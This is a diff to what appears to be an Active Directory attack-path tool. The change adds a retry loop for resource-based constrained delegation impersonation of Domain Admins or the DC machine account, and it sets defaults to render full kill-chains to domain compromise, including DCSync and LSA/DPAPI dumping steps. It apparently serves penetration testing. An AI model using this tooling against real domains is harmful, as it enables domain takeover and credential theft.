+                # Domain Admin may be DENIED a network logon on the DC
+                # (STATUS_LOGON_TYPE_NOT_GRANTED). The centralized retry loop
+                # (st_logon_retry) drives select -> mint -> probe and, on a
+                # network-logon denial, caches the principal + renders the premium
+                # card + RE-SELECTS in place (denied excluded) — no full path
+                # re-run. Per-step specifics are the callbacks below.
+                from adscan_internal.cli.privileged_target_selection import (  # noqa: PLC0415
+                    resolve_privileged_target_candidates,
+                    resolve_privileged_target_user,
+                )
+                from adscan_internal.services.domain_controller_classifier import (  # noqa: PLC0415
+                    is_dc_host,
+                )
+                from adscan_internal.services.exploitation.rbcd_act_executor import (  # noqa: PLC0415
+                    run_execute_rbcd_act,
+                )
+                from adscan_internal.services.exploitation.st_logon_retry import (  # noqa: PLC0415
+                    run_st_mint_with_logon_retry,
+                )
+
+                _target_is_dc = is_dc_host(
+                    host=target_fqdn, domains_data=shell.domains_data, domain=domain
+                )
+
+                def _select_impersonation(excluded: set[str]) -> str | None:
+                    # `excluded` = principals already denied a network logon on this
+                    # host (the loop recomputes it each iteration, so a just-denied
+                    # principal is gone). No hardcoded fallback: if nothing eligible
+                    # is resolved/entered (or the operator cancels), return None and
+                    # let the loop stop cleanly rather than guess a principal.
+                    if _target_is_dc:
+                        # ONE merged prompt: DC machine account (recommended — it
+                        # always network-logs-on to itself) + the eligible DAs.
+                        from adscan_core.output import (  # noqa: PLC0415
+                            questionary_select_index,
+                        )
+
+                        cands = resolve_privileged_target_candidates(
+                            shell,
+                            domain=domain,
+                            purpose="AllowedToAct impersonation (RBCD S4U)",
+                            require_domain_admin=True,
+                            exclude_not_delegated=True,
+                            exclude_protected_users=True,
+                            exclude_principals=excluded or None,
+                            exclude_principals_reason=(
+                                "target denied this principal a network logon (cached)"
+                            ),
+                        )
+                        options = [
+                            f"{target_samname}  (DC machine account — recommended: reliable DCSync, always network-logon)",
+                        ]
+                        options += [
+                            f"{c}  (Domain Admin — may be denied network logon on the DC)"
+                            for c in cands
+                        ]
+                        choice = questionary_select_index(
+                            title=(
+                                f"Impersonation target for RBCD against the DC {target_samname}"
+                            ),
+                            options=options,
+                            default_idx=0,
+                            shell=shell,
+                        )
+                        pick = choice or 0
+                        return target_samname if pick == 0 else cands[pick - 1]
+                    return resolve_privileged_target_user(
+                        shell,
+                        domain=domain,
+                        purpose="AllowedToAct impersonation (RBCD S4U)",
+                        require_domain_admin=True,
+                        exclude_not_delegated=True,
+                        exclude_protected_users=True,
+                        exclude_principals=excluded or None,
+                        exclude_principals_reason=(
+                            "target denied this principal a network logon (cached)"
+                        ),
+                    )
+
+                def _mint_rbcd(principal: str):
+                    return run_execute_rbcd_act(
+                        shell=shell, domain=domain, dc_ip=dc_ip,
+                        member_user=member_user, member_secret=member_secret,
+                        target_samname=target_samname, target_fqdn=target_fqdn,
+                        impersonate_user=principal,
+                        posture_snapshot=posture_snapshot,
+                    )
+
+                def _probe_logon(ccache_path: str) -> tuple[bool, str | None]:
+                    return _probe_ticket_network_logon(
+                        domain=domain, target_ip=dc_ip, target_fqdn=target_fqdn,
+                        kdc_ip=dc_ip, ccache_path=ccache_path,
+                    )
+
+                def _mark_attempted(principal: str) -> None:
+                    try:
+                        update_edge_status_by_labels(
+                            shell, domain, from_label=from_label,
+                            relation="AllowedToAct", to_label=to_label,
+                            status="attempted",
+                            notes={"member": member_user, "impersonate": principal},
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+
+                def _denied_panel(principal: str, host: str, attempt: int) -> None:
+                    _print_st_logon_denied_panel(
+                        principal=principal, host=host, attempt=attempt,
+                        is_dc=_target_is_dc,
+                    )
+
+                execution_started = True
+                with _active_step_context(
+                    action="AllowedToAct", from_label=from_label, to_label=to_label,
+                    notes={"member": member_user},
+                ):
+                    retry = run_st_mint_with_logon_retry(
+                        shell=shell, domain=domain, target_host=target_fqdn,
+                        select_principal=_select_impersonation,
+                        mint=_mint_rbcd,
+                        probe=_probe_logon,
+                        on_attempt=_mark_attempted,
+                        on_logon_denied=_denied_panel,
+                    )
+                    impersonate_user = retry.impersonate_user
+                    rbcd_result = retry.mint_result
+                    try:
+                        update_edge_status_by_labels(
+                            shell, domain, from_label=from_label,
+                            relation="AllowedToAct", to_label=to_label,
+                            status="success" if retry.success else "failed",
+                            notes={
+                                "member": member_user,
+                                "impersonated_user": impersonate_user,
+                                "minted_spns": getattr(rbcd_result, "minted_spns", []),
+                                "tickets_persisted": getattr(
+                                    rbcd_result, "tickets_persisted", 0
+                                ),
+                                "denied_principals": retry.denied_principals,
+                                "error": getattr(rbcd_result, "error", None)
+                                or retry.last_error,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+
+                if not retry.success:
+                    # Surface WHY, then halt — the downstream DCSync/DumpLSA depends
+                    # on a usable ticket against this host.
+                    if retry.mint_failed:
+                        print_warning(
+                            "AllowedToAct did not complete: "
+                            f"{retry.last_error or 'unknown error'}."
+                        )
+                    elif retry.exhausted:
+                        _print_st_logon_exhausted_panel(
+                            host=target_fqdn,
+                            denied_principals=retry.denied_principals,
+                            is_dc=_target_is_dc,
+                        )
+                    if retry.cancelled:
+                        print_warning(
+                            "AllowedToAct: no impersonation target selected — "
+                            "skipping this step."
+                        )
+                        _mark_blocked_step(
+                            action, from_label, to_label, kind="unavailable",
+                            reason="No impersonation target selected",
+                        )
+                    else:
+                        _halt_path_after_failed_step(
+                            action=action,
+                            from_label=from_label,
+                            to_label=to_label,
+                            step_index=idx,
+                            executable_step_position=executable_step_position,
+                            actor=member_user,
+                        )
+                    break
+                continue
+
             if key in {"dumplsa", "dumpdpapi"}:
                 if not from_label:
                     print_warning(
@@ -11366,12 +12197,16 @@ def execute_selected_attack_path(
                         f"(ccache={mark_sensitive(password, 'path')})"
                     )
                 else:
+                    # host=source_host: DumpLSA/DumpDPAPI authenticate via a
+                    # NETWORK logon (SMB session_setup) to source_host, so prefer
+                    # a principal that host has not already denied.
                     exec_username = _resolve_execution_user(
                         shell,
                         domain=domain,
                         context_username=context_username,
                         summary=summary,
                         from_label=from_label,
+                        host=source_host,
                     )
                     password = context_password or _resolve_domain_password(
                         shell, domain, exec_username
@@ -11591,7 +12426,10 @@ def offer_attack_paths_for_execution(
     max_depth: int = 10,
     max_display: int = 20,
     target: str = "highvalue",
-    target_mode: str = "tier0",
+    # object = terminate at the exact domain object so the full kill-chain to
+    # Domain Compromise renders (matches the canonical engine default and
+    # do_attack_paths; tier0 would subsume the tail at the Tier-0 class node).
+    target_mode: str = "object",
     context_username: str | None = None,
     context_password: str | None = None,
     allow_execute_all: bool = False,
@@ -11791,7 +12629,7 @@ def offer_attack_paths_with_non_high_value_fallback(
     max_depth: int = 10,
     max_display: int = 20,
     target: str = "highvalue",
-    target_mode: str = "tier0",
+    target_mode: str = "object",
     display_friendly: bool | None = None,
     context_username: str | None = None,
     context_password: str | None = None,
@@ -12039,7 +12877,7 @@ def _offer_sectioned_attack_paths(
     *,
     summaries: list[dict[str, Any]],
     max_display: int = 20,
-    target_mode: str = "tier0",
+    target_mode: str = "object",
     context_username: str | None = None,
     context_password: str | None = None,
     allow_execute_all: bool = False,
@@ -12049,7 +12887,7 @@ def _offer_sectioned_attack_paths(
     recompute_summaries: Any = None,
     snapshot_scope: str = "domain",
     snapshot_target: str = "all",
-    snapshot_target_mode: str = "tier0",
+    snapshot_target_mode: str = "object",
 ) -> bool:
     """Display attack paths grouped Tier-0, then high-value, then pivots."""
     # Canonical ordering is applied inside offer_attack_paths_for_execution_summaries
@@ -12083,7 +12921,7 @@ def offer_attack_paths_for_execution_for_principals(
     max_depth: int = 10,
     max_display: int = 20,
     target: str = "highvalue",
-    target_mode: str = "tier0",
+    target_mode: str = "object",
     context_username: str | None = None,
     context_password: str | None = None,
     allow_execute_all: bool = False,
@@ -12178,7 +13016,7 @@ def offer_attack_paths_for_execution_summaries(
     recompute_summaries: Callable[[], list[dict[str, Any]]] | None = None,
     snapshot_scope: str = "domain",
     snapshot_target: str = "highvalue",
-    snapshot_target_mode: str = "tier0",
+    snapshot_target_mode: str = "object",
     auto_continue_theoretical_in_non_interactive: bool = True,
 ) -> bool:
     """Shared UX loop for showing/executing already computed path summaries.
